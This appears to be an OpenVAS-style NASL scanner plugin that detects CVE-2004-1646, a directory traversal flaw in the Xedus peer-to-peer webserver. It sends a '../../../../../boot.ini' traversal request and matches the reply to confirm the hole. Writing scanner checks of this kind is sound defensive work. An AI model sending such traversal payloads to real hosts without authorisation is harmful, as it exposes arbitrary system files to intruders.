if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.14645" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_cve_id( "CVE-2004-1646" );
	script_bugtraq_id( 11071 );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_name( "Xedus directory traversal" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2004 David Maciejak" );
	script_family( "Peer-To-Peer File Sharing" );
	script_dependencies( "xedus_detect.sc" );
	script_require_ports( "Services/www", 4274 );
	script_mandatory_keys( "xedus/running" );
	script_tag( name: "solution", value: "Upgrade to the latest version." );
	script_tag( name: "summary", value: "The remote host runs Xedus Peer to Peer webserver. This version is
  vulnerable to directory traversal." );
	script_tag( name: "impact", value: "An attacker could send specially crafted URL to view arbitrary
  files on the system." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("port_service_func.inc.sc");
port = http_get_port( default: 4274 );
if(!get_kb_item( "xedus/" + port + "/running" )){
	exit( 0 );
}
url = "../../../../../boot.ini";
req = http_get( item: url, port: port );
res = http_send_recv( port: port, data: req );
if(egrep( pattern: "\\[boot loader\\]", string: res )){
	report = http_report_vuln_url( port: port, url: url );
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

